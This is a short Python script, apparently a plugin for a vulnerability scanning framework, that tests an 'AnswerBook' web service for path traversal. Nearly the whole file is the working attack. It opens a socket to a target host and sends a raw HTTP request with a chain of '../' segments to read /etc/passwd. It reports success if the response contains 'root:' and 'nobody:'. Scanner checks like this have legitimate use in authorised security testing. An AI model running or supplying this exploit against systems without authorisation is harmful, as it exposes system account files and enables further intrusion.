import sys
import socket
from framework import ExpFrameWork

def AnswerBookFileTravelCheck(ip, port):
    sender = None
    scanlog = ""
    try:
        socket.setdefaulttimeout(5)
        sender = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sender.connect((ip, int(port)))
        scanlog += "[+] AnserBook Connection Established!\\n"
    except Exception as exception:
        scanlog += "[-] Failed To Establish AnswerBook Connection! Reason:%s\\n"%str(exception)
        return 0, scanlog
    try:
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        sender.send(flag)
        scanlog += "[+] Send Payload Success!\\n"
        data = sender.recv(1024)
        scanlog += "[+] Data Received!\\n"
        sender.close()
        if 'root:' in data and 'nobody:' in data:
            return 1, scanlog
    except Exception as exception:
        scanlog += "[-] Scan Failed! Reason:%s\\n" % str(exception)
        return 0, scanlog


if __name__ == "__main__":
    tid = sys.argv[1]
    tname = sys.argv[2]
    vid = sys.argv[3]
    ip = sys.argv[4]
    port = sys.argv[5]
    scanner = ExpFrameWork(tid, tname, vid, ip, port, AnswerBookFileTravelCheck)
    scanner.execute()
